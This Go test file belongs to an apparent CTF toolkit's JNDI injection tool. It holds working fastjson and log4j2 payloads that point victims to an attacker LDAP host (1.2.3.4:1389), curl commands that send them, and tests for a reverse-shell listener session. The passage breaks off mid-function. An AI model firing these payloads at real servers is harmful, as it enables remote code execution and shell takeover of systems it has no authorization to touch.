package web

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"

	"ctfnet/internal/core"
)

// ---------------------------------------------------------------------------
// 进程内 SSH 服务器（x/crypto/ssh ServerConfig）
// ---------------------------------------------------------------------------

type jndiSSHServer struct {
	ln              net.Listener
	handle          func(cmd string, stdin []byte) (int, string, string)
	mu              sync.Mutex
	dropConnections int // 前 N 个连接直接断开（测试瞬态重试）
}

func newJndiSSHServer(t *testing.T, password string, handle func(cmd string, stdin []byte) (int, string, string)) (*jndiSSHServer, string, int) {
	t.Helper()
	cfg := &ssh.ServerConfig{
		PasswordCallback: func(meta ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if string(pass) == password {
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected for %q", meta.User())
		},
	}
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("生成主机密钥失败: %v", err)
	}
	signer, err := ssh.NewSignerFromKey(priv)
	if err != nil {
		t.Fatalf("signer 失败: %v", err)
	}
	cfg.AddHostKey(signer)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen 失败: %v", err)
	}
	srv := &jndiSSHServer{ln: ln, handle: handle}
	tcpAddr := ln.Addr().(*net.TCPAddr)
	go srv.acceptLoop(cfg)
	t.Cleanup(func() { ln.Close() })
	return srv, tcpAddr.IP.String(), tcpAddr.Port
}

func (s *jndiSSHServer) acceptLoop(cfg *ssh.ServerConfig) {
	for {
		conn, err := s.ln.Accept()
		if err != nil {
			return
		}
		s.mu.Lock()
		if s.dropConnections > 0 {
			s.dropConnections--
			s.mu.Unlock()
			conn.Close()
			continue
		}
		s.mu.Unlock()
		go s.handleConn(conn, cfg)
	}
}

func (s *jndiSSHServer) handleConn(conn net.Conn, cfg *ssh.ServerConfig) {
	defer conn.Close()
	sconn, chans, reqs, err := ssh.NewServerConn(conn, cfg)
	if err != nil {
		return
	}
	defer sconn.Close()
	go ssh.DiscardRequests(reqs)
	for newCh := range chans {
		if newCh.ChannelType() != "session" {
			newCh.Reject(ssh.UnknownChannelType, "unsupported")
			continue
		}
		ch, chReqs, err := newCh.Accept()
		if err != nil {
			continue
		}
		go s.handleSession(ch, chReqs)
	}
}

func (s *jndiSSHServer) handleSession(ch ssh.Channel, reqs <-chan *ssh.Request) {
	defer ch.Close()
	for req := range reqs {
		switch req.Type {
		case "exec":
			var payload struct{ Command string }
			if err := ssh.Unmarshal(req.Payload, &payload); err != nil {
				req.Reply(false, nil)
				return
			}
			// 必须先应答 exec 请求、再发 exit-status：两者都走客户端同一个
			// 请求队列（ch.msg），乱序会把 exit-status 当成 exec 的应答消费掉，
			// 会话永远等不到退出状态。因此按 x/crypto 服务端规范形状内联处理：
			// 应答 → 读尽 stdin → 执行 → 写输出 → exit-status → return（关闭通道）。
			req.Reply(true, nil)
			var stdinBuf bytes.Buffer
			_, _ = io.Copy(&stdinBuf, ch) // 客户端会 CloseWrite（无输入时发空 EOF）
			code, out, errS := s.handle(payload.Command, stdinBuf.Bytes())
			_, _ = ch.Write([]byte(out))
			if errS != "" {
				_, _ = ch.Stderr().Write([]byte(errS))
			}
			_, _ = ch.SendRequest("exit-status", false,
				ssh.Marshal(&struct{ Status uint32 }{uint32(code)}))
			return
		default:
			req.Reply(false, nil)
		}
	}
}

func newJndiClient(host string, port int, password, storePath string, hosts map[string]string) *jndiSSHClient {
	if hosts == nil {
		hosts = loadJndiHostKeys(storePath)
	}
	return &jndiSSHClient{
		host:     host,
		port:     port,
		user:     "root",
		password: password,
		store:    &jndiHostKeyStore{path: storePath, hosts: hosts},
	}
}

// ---------------------------------------------------------------------------
// 注册与参数
// ---------------------------------------------------------------------------

func TestJndiToolRegistered(t *testing.T) {
	tool, ok := core.DefaultRegistry.Get("web.jndi")
	if !ok {
		t.Fatal("web.jndi 未注册")
	}
	if tool.Version() != "1.0.0" || tool.Timeout() != 300 || tool.Category() != core.CatWeb {
		t.Fatalf("version/timeout/category = %s/%d/%s", tool.Version(), tool.Timeout(), tool.Category())
	}
	ps := tool.Params()
	if len(ps) != 21 {
		t.Fatalf("参数数 = %d, 期望 21", len(ps))
	}
	specs := map[string]core.ParamSpec{}
	for _, s := range ps {
		specs[s.Name] = s
	}
	for _, name := range []string{"ssh_host", "ssh_port", "ssh_user", "ssh_pass", "putty_dir",
		"lhost", "ldap_port", "jndi_protocol", "rmi_port", "http_port", "lport",
		"target_url", "trigger", "custom_template", "log4j_header", "command",
		"interactive", "gadget_class", "wait_time", "shell", "cleanup"} {
		if _, ok := specs[name]; !ok {
			t.Errorf("缺少参数: %s", name)
		}
	}
	// ssh_host/ssh_user/ssh_pass 不再必填：空值由统一配置（config.json）兜底，
	// 仍为空的在 Run 时报错提示去设置页配置。
	if specs["ssh_host"].Required || specs["ssh_user"].Required || specs["ssh_pass"].Required {
		t.Error("ssh_host/ssh_user/ssh_pass 应为可选（配置兜底）")
	}
	if specs["ssh_pass"].Type != "password" {
		t.Errorf("ssh_pass 类型 = %q", specs["ssh_pass"].Type)
	}
	checks := map[string]any{
		"ssh_port":      22,
		"putty_dir":     `D:\putty`,
		"lhost":         "",
		"ldap_port":     1389,
		"jndi_protocol": "ldap",
		"rmi_port":      1099,
		"http_port":     8888,
		"lport":         31339,
		"target_url":    "",
		"trigger":       "fastjson_1.2.47",
		"log4j_header":  "X-Api-Version,User-Agent,X-Forwarded-For",
		"command":       "cat /flag",
		"interactive":   true,
		"gadget_class":  "com.sun.rowset.JdbcRowSetImpl",
		"wait_time":     60,
		"shell":         "/bin/sh",
		"cleanup":       true,
	}
	for name, want := range checks {
		if got := specs[name].Default; got != want {
			t.Errorf("%s 默认值 = %v, 期望 %v", name, got, want)
		}
	}
}

func TestJndiValidate(t *testing.T) {
	tool, _ := core.DefaultRegistry.Get("web.jndi")
	// 空参也可通过校验（SSH 凭据由统一配置兜底），默认值照常填充
	v0, err := tool.ValidateParams(map[string]any{})
	if err != nil {
		t.Fatalf("空参校验失败: %v", err)
	}
	if v0["ssh_port"] != 22 || v0["jndi_protocol"] != "ldap" {
		t.Errorf("空参默认值填充错误: %v", v0)
	}
	v, err := tool.ValidateParams(map[string]any{"ssh_host": "1.2.3.4", "ssh_user": "root", "ssh_pass": "p"})
	if err != nil {
		t.Fatalf("校验失败: %v", err)
	}
	if v["ssh_port"] != 22 || v["jndi_protocol"] != "ldap" || v["lport"] != 31339 ||
		v["trigger"] != "fastjson_1.2.47" || v["wait_time"] != 60 || v["cleanup"] != true {
		t.Errorf("默认值填充错误: %v", v)
	}
}

func TestJndiProtocolError(t *testing.T) {
	tool, _ := core.DefaultRegistry.Get("web.jndi")
	_, err := tool.Run(context.Background(), map[string]any{
		"ssh_host": "1.2.3.4", "ssh_user": "root", "ssh_pass": "p",
		"jndi_protocol": "ftp",
	}, &core.ToolContext{Workdir: filepath.Join(t.TempDir(), "work", "job1")})
	if err == nil || err.Error() != "RuntimeError: 未知 jndi_protocol: ftp（可选: ldap | rmi）" {
		t.Fatalf("错误 = %v", err)
	}
}

// ---------------------------------------------------------------------------
// PoC 生成（jndiBuildPoc）
// ---------------------------------------------------------------------------

func TestJndiBuildPoc(t *testing.T) {
	p := jndiParamsX{
		trigger:     "fastjson_1.2.47",
		jndiURL:     "ldap://1.2.3.4:1389/ExploitAbcdef12",
		gadget:      "com.sun.rowset.JdbcRowSetImpl",
		log4jHeader: jndiLog4jDefaultHeader,
		isLog4j:     false,
	}
	pocRaw, curlCmd, poc, headers, err := jndiBuildPoc(p)
	if err != nil {
		t.Fatalf("buildPoc: %v", err)
	}
	want := `{"a": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "b": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://1.2.3.4:1389/ExploitAbcdef12", "autoCommit": true}}`
	if pocRaw != want {
		t.Errorf("pocRaw = %s", pocRaw)
	}
	if a, ok := poc["a"].(map[string]any); !ok || a["@type"] != "java.lang.Class" {
		t.Errorf("poc 嵌套解析错误: %v", poc)
	}
	if len(headers) != 3 || headers[0] != "X-Api-Version" {
		t.Errorf("headers = %v", headers)
	}
	wantCurl := `curl -s -X POST '<TARGET_URL>' -H 'Content-Type: application/json' -d '` + want + `'`
	if curlCmd != wantCurl {
		t.Errorf("curlCmd = %s", curlCmd)
	}

	// log4j2：请求头注入 + body
	p.trigger, p.isLog4j = "log4j2", true
	pocRaw, curlCmd, poc, _, err = jndiBuildPoc(p)
	if err != nil {
		t.Fatalf("buildPoc log4j2: %v", err)
	}
	if pocRaw != "${jndi:ldap://1.2.3.4:1389/ExploitAbcdef12}" {
		t.Errorf("log4j pocRaw = %s", pocRaw)
	}
	if poc["raw"] != pocRaw {
		t.Errorf("非 JSON poc 应回退 raw: %v", poc)
	}
	for _, want := range []string{
		"curl -s -X POST '<TARGET_URL>'",
		"-H 'X-Api-Version: ${jndi:ldap://1.2.3.4:1389/ExploitAbcdef12}'",
		"-H 'User-Agent: ${jndi:ldap://1.2.3.4:1389/ExploitAbcdef12}'",
		"-H 'X-Forwarded-For: ${jndi:ldap://1.2.3.4:1389/ExploitAbcdef12}'",
		"-d '${jndi:ldap://1.2.3.4:1389/ExploitAbcdef12}'",
	} {
		if !strings.Contains(curlCmd, want) {
			t.Errorf("log4j curlCmd 缺少 %q: %s", want, curlCmd)
		}
	}

	// custom 模板
	p.trigger, p.isLog4j, p.customTemplate = "custom", false, `{"x": "{{JNDI_URL}}", "g": "{{GADGET}}"}`
	pocRaw, _, _, _, err = jndiBuildPoc(p)
	if err != nil || pocRaw != `{"x": "ldap://1.2.3.4:1389/ExploitAbcdef12", "g": "com.sun.rowset.JdbcRowSetImpl"}` {
		t.Errorf("custom = %q err=%v", pocRaw, err)
	}

	// custom 空模板 → 报错（与 Python 一致：空 template 走未知 trigger 分支）
	p.customTemplate = ""
	_, _, _, _, err = jndiBuildPoc(p)
	if err == nil || !strings.Contains(err.Error(), "未知 trigger: custom（可选: fastjson_1.2.24, fastjson_1.2.41, fastjson_1.2.42, fastjson_1.2.43, fastjson_1.2.47, log4j2 或 custom）") {
		t.Errorf("custom 空模板错误 = %v", err)
	}

	// 未知 trigger
	p.trigger = "nope"
	_, _, _, _, err = jndiBuildPoc(p)
	if err == nil || !strings.Contains(err.Error(), "未知 trigger: nope（可选: ") {
		t.Errorf("未知 trigger 错误 = %v", err)
	}

	// 指定 target_url
	p.trigger = "fastjson_1.2.24"
	p.targetURL = "http://t/login"
	_, curlCmd, _, _, _ = jndiBuildPoc(p)
	if !strings.Contains(curlCmd, "curl -s -X POST 'http://t/login'") {
		t.Errorf("target_url curl = %s", curlCmd)
	}
}

// ---------------------------------------------------------------------------
// HTTP POST / 外部可达性
// ---------------------------------------------------------------------------

func TestJndiPost(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/ok" {
			_, _ = w.Write([]byte("hello"))
			return
		}
		w.WriteHeader(404)
	}))
	defer srv.Close()

	status, body, ok := jndiPost(srv.URL+"/ok", "{}", nil, "application/json", 5*time.Second)
	if !ok || status != 200 || body != "hello" {
		t.Errorf("200: %d %q %v", status, body, ok)
	}
	status, body, ok = jndiPost(srv.URL+"/nope", "{}", nil, "application/json", 5*time.Second)
	if ok || status != 0 || body != "HTTPError: HTTP Error 404: Not Found" {
		t.Errorf("404: %d %q %v", status, body, ok)
	}

	// 自签名 TLS：容忍（CERT_NONE）
	tlsSrv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("tls"))
	}))
	defer tlsSrv.Close()
	status, body, ok = jndiPost(tlsSrv.URL, "x", nil, "application/json", 5*time.Second)
	if !ok || status != 200 || body != "tls" {
		t.Errorf("tls: %d %q %v", status, body, ok)
	}

	// 拒绝连接 → URLError
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	addr := ln.Addr().String()
	ln.Close()
	_, body, ok = jndiPost("http://"+addr+"/", "x", nil, "application/json", 2*time.Second)
	if ok || !strings.Contains(body, "URLError: <urlopen error") {
		t.Errorf("refused: %q %v", body, ok)
	}
}

func TestJndiCheckExternal(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer ln.Close()
	openPort := ln.Addr().(*net.TCPAddr).Port

	ln2, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	closedPort := ln2.Addr().(*net.TCPAddr).Port
	ln2.Close()

	res := jndiCheckExternal("127.0.0.1", []int{openPort, closedPort}, 2*time.Second)
	if res[openPort] != "OK" {
		t.Errorf("开放端口 = %q", res[openPort])
	}
	if !strings.Contains(res[closedPort], "ConnectionRefusedError") {
		t.Errorf("关闭端口 = %q", res[closedPort])
	}
}

// ---------------------------------------------------------------------------
// SSH 客户端（真实 in-process 服务器）
// ---------------------------------------------------------------------------

// jndiBashHandle 用本机 bash 执行远程命令（Git Bash 可用时）。
func jndiBashHandle(bashPath string) func(cmd string, stdin []byte) (int, string, string) {
	return func(cmd string, stdin []byte) (int, string, string) {
		c := exec.Command(bashPath, "-c", cmd)
		c.Stdin = bytes.NewReader(stdin)
		var out, errB bytes.Buffer
		c.Stdout, c.Stderr = &out, &errB
		err := c.Run()
		if err == nil {
			return 0, out.String(), errB.String()
		}
		if ee, ok := err.(*exec.ExitError); ok {
			return ee.ExitCode(), out.String(), errB.String()
		}
		return -1, out.String(), errB.String() + err.Error()
	}
}

func TestJndiSSHExecRoundtrip(t *testing.T) {
	bashPath, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash 不可用，跳过 SSH 真实命令测试")
	}
	srv, host, port := newJndiSSHServer(t, "secret", jndiBashHandle(bashPath))
	_ = srv
	client := newJndiClient(host, port, "secret", filepath.Join(t.TempDir(), "keys.json"), nil)

	code, out, errS := client.exec(context.Background(), "echo OK", 10*time.Second)
	if code != 0 || !strings.Contains(out, "OK") || errS != "" {
		t.Fatalf("echo OK: %d %q %q", code, out, errS)
	}
	code, _, _ = client.exec(context.Background(), "exit 7", 10*time.Second)
	if code != 7 {
		t.Fatalf("exit 7: code = %d", code)
	}
	// 上传 + 回读（多字节内容原样）
	remote := fmt.Sprintf("/tmp/ctf-jndi-go-test-%d.txt", time.Now().UnixNano())
	code, msg := client.putText(context.Background(), []byte("hello 世界\nsecond line\n"), remote, 10*time.Second)
	if code != 0 || msg != "" {
		t.Fatalf("putText: %d %q", code, msg)
	}
	code, out, _ = client.exec(context.Background(), "cat "+remote, 10*time.Second)
	if code != 0 || out != "hello 世界\nsecond line\n" {
		t.Fatalf("cat 回读: %d %q", code, out)
	}
	// 密码错误：认证失败立即返回（不重试）
	bad := newJndiClient(host, port, "wrong", filepath.Join(t.TempDir(), "keys.json"), nil)
	code, _, errS = bad.exec(context.Background(), "echo OK", 10*time.Second)
	if code == 0 || !strings.Contains(errS, "unable to authenticate") {
		t.Fatalf("错误密码: %d %q", code, errS)
	}
}

func TestJndiSSHTransientRetry(t *testing.T) {
	srv, host, port := newJndiSSHServer(t, "pass", func(cmd string, stdin []byte) (int, string, string) {
		return 0, "OK\n", ""
	})
	srv.mu.Lock()
	srv.dropConnections = 1
	srv.mu.Unlock()
	client := newJndiClient(host, port, "pass", filepath.Join(t.TempDir(), "keys.json"), nil)
	start := time.Now()
	code, out, errS := client.exec(context.Background(), "echo OK", 10*time.Second)
	if code != 0 || !strings.Contains(out, "OK") {
		t.Fatalf("重试后应成功: code=%d out=%q err=%q", code, out, errS)
	}
	if elapsed := time.Since(start); elapsed < 2*time.Second {
		t.Fatalf("应发生瞬态退避（≥2s），实际 %v", elapsed)
	}
}

func TestJndiSSHHostKeyMismatch(t *testing.T) {
	srv, host, port := newJndiSSHServer(t, "pass", func(cmd string, stdin []byte) (int, string, string) {
		return 0, "OK\n", ""
	})
	_ = srv
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	storePath := filepath.Join(t.TempDir(), "keys.json")
	client := newJndiClient(host, port, "pass", storePath,
		map[string]string{addr: "SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="})
	_, _, errS := client.exec(context.Background(), "echo OK", 5*time.Second)
	if !strings.Contains(errS, "主机密钥不匹配") {
		t.Fatalf("指纹不匹配应被拒绝: %q", errS)
	}
}

func TestJndiSSHTOFU(t *testing.T) {
	srv, host, port := newJndiSSHServer(t, "pass", func(cmd string, stdin []byte) (int, string, string) {
		return 0, "OK\n", ""
	})
	_ = srv
	storePath := filepath.Join(t.TempDir(), "keys.json")
	client := newJndiClient(host, port, "pass", storePath, nil)
	if code, _, _ := client.exec(context.Background(), "echo OK", 10*time.Second); code != 0 {
		t.Fatalf("首次连接失败: %d", code)
	}
	// 指纹已持久化到数据目录
	saved := loadJndiHostKeys(storePath)
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	fp := saved[addr]
	if !strings.HasPrefix(fp, "SHA256:") {
		t.Fatalf("未记录指纹: %v", saved)
	}
	// 第二次连接（新客户端，从磁盘加载）指纹一致 → 成功
	client2 := newJndiClient(host, port, "pass", storePath, nil)
	if code, _, _ := client2.exec(context.Background(), "echo OK", 10*time.Second); code != 0 {
		t.Fatalf("指纹校验后连接失败: %d", code)
	}
}

// ---------------------------------------------------------------------------
// 交互会话协议（fake 执行器模拟 fifo 与 rev.out）
// ---------------------------------------------------------------------------

type fakeJndiExec struct {
	mu        sync.Mutex
	revOut    string
	fifoFail  bool
	logLines  []string
	grepCount string
	kills     []string
	cmds      []string
	lastFifo  string
}

func (f *fakeJndiExec) exec(ctx context.Context, cmd string, timeout time.Duration) (int, string, string) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.cmds = append(f.cmds, cmd)
	switch {
	case strings.HasPrefix(cmd, "kill "):
		f.kills = append(f.kills, cmd)
		return 0, "", ""
	case strings.HasPrefix(cmd, "echo ") && strings.Contains(cmd, "rev.fifo"):
		if f.fifoFail {
			return 1, "", "ssh: broken pipe"
		}
		fields := strings.Fields(cmd)
		data, err := base64.StdEncoding.DecodeString(fields[1])
		if err != nil {
			return 1, "", err.Error()
		}
		f.lastFifo = string(data)
		// payload = "{command}\necho __CTF_DONE_n__$?\n" → 模拟 shell 执行
		lines := strings.Split(f.lastFifo, "\n")
		marker := strings.TrimSuffix(strings.TrimPrefix(lines[1], "echo "), "$?")
		for _, ln := range f.logLines {
			f.revOut += ln + "\n"
		}
		f.logLines = nil
		f.revOut += "out:" + lines[0] + "\n" + marker + "0\n"
		return 0, "", ""
	case strings.HasPrefix(cmd, "cat ") && strings.Contains(cmd, "rev.out"):
		return 0, f.revOut, ""
	case strings.Contains(cmd, "grep -cE"):
		return 0, f.grepCount, ""
	}
	return 0, "", ""
}

func (f *fakeJndiExec) putText(ctx context.Context, content []byte, remotePath string, timeout time.Duration) (int, string) {
	return 0, ""
}

func TestJndiShellProtocol(t *testing.T) {
	f := &fakeJndiExec{revOut: "Listening on 0.0.0.0 31339\nbanner 行\n"}
	sh := &jndiShell{
		client:  f,
		workdir: "/tmp/w",
		pids:    map[string]string{"http": "11", "ldap": "22", "listener": "33", "fifo": "44"},
		refSvc:  "ldap",
	}
	sh.setup(context.Background())
	if sh.lastLen != pyLen("Listening on 0.0.0.0 31339\nbanner 行\n") {
		t.Fatalf("基线长度 = %d", sh.lastLen)
	}
	if len(f.kills) != 2 || !strings.Contains(f.kills[0], "kill 11") || !strings.Contains(f.kills[1], "kill 22") {
		t.Fatalf("setup 应只回收 http/ldap: %v", f.kills)
	}

	out, timedOut, closed := sh.execCommand(context.Background(), "id", 5*time.Second)
	if out != "out:id" || timedOut || closed {
		t.Fatalf("首个命令: %q timed_out=%v closed=%v", out, timedOut, closed)
	}
	// 多字节输出：偏移按码点累计（tail -c 按字节会错位）
	out, timedOut, closed = sh.execCommand(context.Background(), "echo 世界", 5*time.Second)
	if out != "out:echo 世界" || timedOut || closed {
		t.Fatalf("多字节增量: %q timed_out=%v closed=%v", out, timedOut, closed)
	}
	// 监听器日志行被过滤；Connection closed → closed=true
	f.logLines = []string{"Accepted connection from 1.2.3.4", "Connection closed"}
	out, timedOut, closed = sh.execCommand(context.Background(), "ls", 5*time.Second)
	if out != "out:ls" || timedOut || !closed {
		t.Fatalf("日志过滤/断开检测: %q timed_out=%v closed=%v", out, timedOut, closed)
	}
	// fifo 写入失败 → [下发失败] + 会话断开
	f.fifoFail = true
	out, _, closed = sh.execCommand(context.Background(), "whoami", 5*time.Second)
	if !strings.Contains(out, "[下发失败]") || !closed {
		t.Fatalf("fifo 失败: %q closed=%v", out, closed)
	}
}

func TestJndiShellClose(t *testing.T) {
	f := &fakeJndiExec{}
	sh := &jndiShell{client: f, workdir: "/tmp/w", pids: map[string]string{"listener": "33", "fifo": "44"}}
	sh.close(context.Background())
	joined := strings.Join(f.cmds, "\n")
	for _, want := range []string{
		"kill 33 44 2>/dev/null || true",
		"pkill -f 'sleep 999[9]99' 2>/dev/null; pkill -f 'reverse_listene[r]' 2>/dev/null || true",
		"rm -rf /tmp/w",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("close 缺少命令 %q: %s", want, joined)
		}
	}
}

func TestJndiWaitHelpers(t *testing.T) {
	oldConn, oldListen := jndiWaitConnInterval, jndiWaitListenInterval
	jndiWaitConnInterval, jndiWaitListenInterval = 20*time.Millisecond, 20*time.Millisecond
	defer func() { jndiWaitConnInterval, jndiWaitListenInterval = oldConn, oldListen }()

	f := &fakeJndiExec{grepCount: "2"}
	if !jndiWaitConnection(context.Background(), f, 31339, time.Second) {
		t.Error("grep 计数 2 应立即判定已连接")
	}
	f.grepCount = "0"
	if jndiWaitConnection(context.Background(), f, 31339, 100*time.Millisecond) {
		t.Error("grep 计数 0 应超时返回 false")
	}
	f.grepCount = "1"
	if !jndiWaitListen(context.Background(), f, 31339, time.Second) {
		t.Error("grep 计数 1 应立即判定已监听")
	}
	f.grepCount = "0"
	if jndiWaitListen(context.Background(), f, 31339, 100*time.Millisecond) {
		t.Error("grep 计数 0 应超时返回 false")
	}
}

// ---------------------------------------------------------------------------
// 全流程（脚本化 SSH 服务器跑 7 步）
// ---------------------------------------------------------------------------

type jndiScriptStep struct {
	pre  string
	code int
	out  string
	cap  *string
}

func newJndiFlowServer(t *testing.T, uploaded *string) (*jndiSSHServer, string, int) {
	t.Helper()
	seq := []jndiScriptStep{
		{pre: "echo OK", code: 0, out: "OK\n"},
		{pre: "for c in javac", code: 0, out: ""},
		{pre: "ss -tln 2>/dev/null | grep -E ':", code: 0, out: ""},
		{pre: "mkdir -p ", code: 0, out: ""},
		{pre: "cat > ", code: 0, out: "", cap: uploaded},
		{pre: "cat > ", code: 0, out: ""},
		{pre: "cat > ", code: 0, out: ""},
		{pre: "cd ", code: 0, out: ""},
		{pre: "nohup python3 -m http.server", code: 0, out: "111\n"},
		{pre: "nohup python3 ", code: 0, out: "222\n"},
		{pre: "mkfifo ", code: 0, out: "333\n"},
		{pre: "nohup python3 ", code: 0, out: "444\n"},
		{pre: "ss -tln 2>/dev/null | grep -E ':", code: 0,
			out: "LISTEN 0 128 0.0.0.0:8888 *:*\nLISTEN 0 128 0.0.0.0:1389 *:*\nLISTEN 0 128 0.0.0.0:31339 *:*\n"},
	}
	var mu sync.Mutex
	i := 0
	handle := func(cmd string, stdin []byte) (int, string, string) {
		mu.Lock()
		defer mu.Unlock()
		if i < len(seq) && strings.HasPrefix(cmd, seq[i].pre) {
			step := seq[i]
			i++
			if step.cap != nil {
				*step.cap = string(stdin)
			}
			return step.code, step.out, ""
		}
		switch {
		case strings.HasPrefix(cmd, "(ss -tn"):
			return 0, "0", ""
		case strings.HasPrefix(cmd, "ss -tlnp"):
			return 0, "", ""
		case strings.HasPrefix(cmd, "ss -tln"):
			return 0, "0", ""
		case strings.HasPrefix(cmd, "echo ==ldap.log=="):
			return 0, "ldap server running\n", ""
		case strings.HasPrefix(cmd, "kill "):
			return 0, "", ""
		case strings.HasPrefix(cmd, "pkill"):
			return 0, "", ""
		case strings.HasPrefix(cmd, "rm -rf"):
			return 0, "", ""
		}
		return 0, "", ""
	}
	return newJndiSSHServer(t, "pass", handle)
}

func TestJndiFullFlow(t *testing.T) {
	tool, _ := core.DefaultRegistry.Get("web.jndi")

	oldConn, oldListen, oldBlind, oldPost := jndiWaitConnInterval, jndiWaitListenInterval, jndiBlindWaitListenTimeout, jndiPostWaitListenTimeout
	jndiWaitConnInterval = 30 * time.Millisecond
	jndiWaitListenInterval = 30 * time.Millisecond
	jndiBlindWaitListenTimeout = 100 * time.Millisecond
	jndiPostWaitListenTimeout = 100 * time.Millisecond
	defer func() {
		jndiWaitConnInterval, jndiWaitListenInterval, jndiBlindWaitListenTimeout, jndiPostWaitListenTimeout =
			oldConn, oldListen, oldBlind, oldPost
	}()

	runJndi := func(targetURL string, uploaded *string) *core.ToolResult {
		t.Helper()
		srv, host, port := newJndiFlowServer(t, uploaded)
		_ = srv
		params, err := tool.ValidateParams(map[string]any{
			"ssh_host": host, "ssh_port": float64(port), "ssh_user": "root", "ssh_pass": "pass",
			"lhost": host, "wait_time": 5, "target_url": targetURL,
		})
		if err != nil {
			t.Fatalf("validate: %v", err)
		}
		res, err := tool.Run(context.Background(), params, &core.ToolContext{
			Workdir:  filepath.Join(t.TempDir(), "work", "job1"),
			Sessions: core.NewSessionRegistry(),
		})
		if err != nil {
			t.Fatalf("run: %v", err)
		}
		return res
	}

	// 运行 1：无 target_url → SUCCESS（PoC 生成但未发送）
	var uploaded string
	res := runJndi("", &uploaded)
	if res.Status != core.StatusSuccess {
		t.Fatalf("status = %s, stderr = %q", res.Status, res.Stderr)
	}
	for _, want := range []string{
		"== JNDI 注入执行报告 ==",
		"已使用内置 Go SSH（不依赖 PuTTY，putty_dir 参数忽略）",
		"[1/7] SSH 连接", "连接成功",
		"[2/7] 检查远程环境（javac/python3/base64）...",
		"[3/7] 生成模板并部署到", "编译成功: /tmp/ctf-jndi-",
		"[4/7] 启动 HTTP/8888、LDAP/1389、反弹监听/31339 ...",
		"监听状态: LISTEN 0 128 0.0.0.0:8888",
		"外部可达性: 8888: ConnectionRefusedError",
		"[5/7] 生成 PoC（触发模板: fastjson_1.2.47）...",
		"JNDI: ldap://127.0.0.1:1389/Exploit",
		"[6/7] 未提供 target_url，跳过自动发送（请手动发送 PoC）",
		"[7/7] 等待反弹 shell 连接（≤5s）...",
		"超时未收到连接（检查靶机 JDK 版本 / 出网策略 / 端口是否可达）",
		"服务日志诊断:", "ldap server running",
		"== PoC（fastjson_1.2.47）==",
		"== 手动复现 ==", "curl -s -X POST '<TARGET_URL>'",
		`"autoCommit": true`,
		"[cleanup] 已清理远程进程与工作目录",
	} {
		if !strings.Contains(res.Stdout, want) {
			t.Errorf("输出缺少 %q\n---\n%s", want, res.Stdout)
		}
	}
	if res.Stderr != "" {
		t.Errorf("stderr = %q", res.Stderr)
	}
	cls, _ := res.Data["class_name"].(string)
	if !strings.HasPrefix(cls, "Exploit") || len(cls) != 15 {
		t.Errorf("class_name = %q", cls)
	}
	if res.Data["jndi_protocol"] != "ldap" || res.Data["trigger"] != "fastjson_1.2.47" {
		t.Errorf("data = %v", res.Data)
	}
	if connected, _ := res.Data["connected"].(bool); connected {
		t.Error("connected 应为 false")
	}
	if res.Data["session_id"] != "" || res.Data["workdir"] != "" {
		t.Errorf("session_id/workdir = %v/%v", res.Data["session_id"], res.Data["workdir"])
	}
	if hr, _ := res.Data["http_response"].(map[string]any); len(hr) != 0 {
		t.Errorf("http_response 应为空: %v", res.Data["http_response"])
	}
	if res.Data["poc"] == nil || res.Data["curl_cmd"] == "" || res.Data["jndi_url"] == "" {
		t.Errorf("poc/curl_cmd/jndi_url 缺失: %v", res.Data)
	}
	// 上传的 java 模板已渲染占位符（类名随机化 + 主机/端口/shell 注入）
	if !strings.Contains(uploaded, "class "+cls) ||
		!strings.Contains(uploaded, "127.0.0.1") ||
		!strings.Contains(uploaded, "31339") ||
		!strings.Contains(uploaded, "/bin/sh") {
		t.Errorf("上传的 java 未渲染占位符:\n%.300s", uploaded)
	}

	// 运行 2：带 target_url → POST 被拒（连接拒绝）+ 盲发跳过 + ERROR
	res2 := runJndi("http://127.0.0.1:1/", &uploaded)
	if res2.Status != core.StatusError {
		t.Fatalf("status = %s", res2.Status)
	}
	if res2.Stderr != "未收到反弹 shell 连接，PoC 已生成（见输出中的 PoC 与 curl 命令）" {
		t.Errorf("stderr = %q", res2.Stderr)
	}
	for _, want := range []string{
		"响应: 异常 URLError: <urlopen error",
		"（fastjson 场景下 'set property error, autoCommit' 属预期回显）",
		"监听器未在监听，跳过盲发（回连从未建立）",
		"curl -s -X POST 'http://127.0.0.1:1/'",
	} {
		if !strings.Contains(res2.Stdout, want) {
			t.Errorf("输出缺少 %q\n---\n%s", want, res2.Stdout)
		}
	}
	hr, _ := res2.Data["http_response"].(map[string]any)
	if hr == nil || hr["error"] == nil || !strings.Contains(fmt.Sprint(hr["error"]), "URLError") {
		t.Errorf("http_response = %v", res2.Data["http_response"])
	}
}

// 验证：连接失败（认证失败）时的报告与错误文案
func TestJndiFlowAuthFail(t *testing.T) {
	tool, _ := core.DefaultRegistry.Get("web.jndi")
	// 服务器拒绝一切密码
	srv, host, port := newJndiSSHServer(t, "correct", func(cmd string, stdin []byte) (int, string, string) {
